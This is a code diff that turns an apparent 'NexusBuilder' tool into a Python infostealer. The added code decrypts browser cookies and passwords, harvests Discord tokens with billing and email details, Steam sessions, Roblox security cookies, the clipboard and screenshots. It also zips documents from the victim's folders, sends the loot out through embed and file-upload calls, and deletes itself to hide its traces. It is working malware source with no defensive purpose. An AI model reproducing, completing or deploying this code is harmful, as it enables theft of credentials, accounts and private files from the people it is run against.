+            shutil.copy2(db_file, tmp)
+            conn = sqlite3.connect(tmp)
+            c = conn.cursor()
+            c.execute("SELECT host_key, name, encrypted_value FROM cookies LIMIT 200")
+            for host, n, val in c.fetchall():
+                if isinstance(val, bytes):
+                    dec = decrypt_value(val, master)
+                    if dec:
+                        all_cookies.append(f"{host} → {n} = `{dec[:80]}`")
+            conn.close()
+        except:
+            pass
+        finally:
+            try: os.unlink(tmp)
+            except: pass
+    return all_cookies
+
+def grab_files_to_zip():
+    import zipfile
+    target_folders = []
+    for f in GRAB_FOLDERS:
+        if f == "Desktop":
+            folder = os.path.join(os.environ['USERPROFILE'], 'Desktop')
+        elif f == "Documents":
+            folder = os.path.join(os.environ['USERPROFILE'], 'Documents')
+        elif f == "Downloads":
+            folder = os.path.join(os.environ['USERPROFILE'], 'Downloads')
+        else:
+            folder = f
+        if os.path.exists(folder):
+            target_folders.append(folder)
+    if not target_folders:
+        return None
+    collected = []
+    for base in target_folders:
+        for root, _, files in os.walk(base):
+            for file in files:
+                if any(file.lower().endswith(ext.lower()) for ext in FILE_EXTS):
+                    full = os.path.join(root, file)
+                    try:
+                        if os.path.getsize(full) < 20 * 1024 * 1024:
+                            collected.append(full)
+                    except:
+                        pass
+    if not collected:
+        return None
+    zip_path = os.path.join(tempfile.gettempdir(), "stolen_files.zip")
+    try:
+        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
+            for f in collected[:100]:
+                try:
+                    zf.write(f, arcname=os.path.basename(f))
+                except:
+                    pass
+    except:
+        return None
+    seven_zip = r"C:\Program Files\7-Zip\7z.exe"
+    if os.path.exists(seven_zip) and ZIP_PASSWORD:
+        pwd_zip = zip_path.replace('.zip', '_pwd.zip')
+        subprocess.run([seven_zip, 'a', f'-p{ZIP_PASSWORD}', pwd_zip, zip_path], capture_output=True)
+        return pwd_zip
+    return zip_path
+
+def get_public_ip():
+    try:
+        return requests.get('https://api.ipify.org', timeout=5).text
+    except:
+        return 'Unknown'
+
+def self_delete():
+    try:
+        if sys.argv[0].endswith('.exe'):
+            os.system(f'ping 127.0.0.1 -n 3 > nul & del "{sys.argv[0]}"')
+        else:
+            os.remove(sys.argv[0])
+    except:
+        pass
+
+# ---------- Main execution with clean embeds ----------
 if __name__ == "__main__":
-    app = NexusBuilder()
-    app.mainloop()
+    if LOG_IP:
+        send_embed(f"🌐 IP Address", f"```{get_public_ip()}```", color=0x3498db)
+
+    if SCREENSHOT:
+        take_screenshot()
+
+    if CLIPBOARD:
+        clip = steal_clipboard()
+        if clip:
+            send_embed(f"📋 Clipboard Content", f"```{clip}```", color=0xf1c40f)
+
+    if STEAM:
+        steam = steal_steam()
+        if steam:
+            send_embed(f"🎮 Steam Session", f"```{steam}```", color=0x1abc9c)
+
+    if DISCORD_TOKENS:
+        tokens_info = get_all_tokens()
+        if tokens_info:
+            for (user, uid, email, mfa, nitro, billing, gifts, token) in tokens_info:
+                fields = [
+                    {"name": "🆔 User", "value": user, "inline": True},
+                    {"name": "📧 Email", "value": email, "inline": True},
+                    {"name": "🔐 MFA", "value": str(mfa), "inline": True},
+                    {"name": "✨ Nitro", "value": nitro, "inline": True},
+                    {"name": "💳 Billing", "value": billing, "inline": True},
+                    {"name": "🎁 Gifts", "value": gifts[:500] if len(gifts) > 500 else gifts, "inline": False},
+                    {"name": "🔑 Token", "value": f"||{token}||", "inline": False}
+                ]
+                send_embed(f"🎟️ Discord Account", None, color=0x5865F2, fields=fields)
+        if DISCORD_FILES:
+            files = steal_discord_files()
+            if files:
+                send_embed(f"📁 Discord Local Files", "```\n" + "\n".join(files[:20]) + "\n```", color=0x7289da)
+
+    roblox = steal_roblox_cookies()
+    if roblox:
+        send_embed(f"🎲 Roblox .ROBLOSECURITY Cookies", "```\n" + "\n".join(roblox[:20]) + "\n```", color=0xee2b47)
+
+    if BROWSER_PASSWORDS:
+        pws = steal_browser_passwords()
+        if pws:
+            send_embed(f"🔑 Browser Passwords", "```\n" + "\n".join(pws[:50]) + "\n```", color=0xe67e22)
+
+    if COOKIES:
+        cks = steal_cookies()
+        if cks:
+            send_embed(f"🍪 Browser Cookies", "```\n" + "\n".join(cks[:50]) + "\n```", color=0x2ecc71)
+
+    if FILE_GRABBER:
+        zipf = grab_files_to_zip()
+        if zipf and os.path.exists(zipf):
+            send_file(zipf, "📦 Grabbed Files (ZIP)")
+
+    if MELT:
+        self_delete()
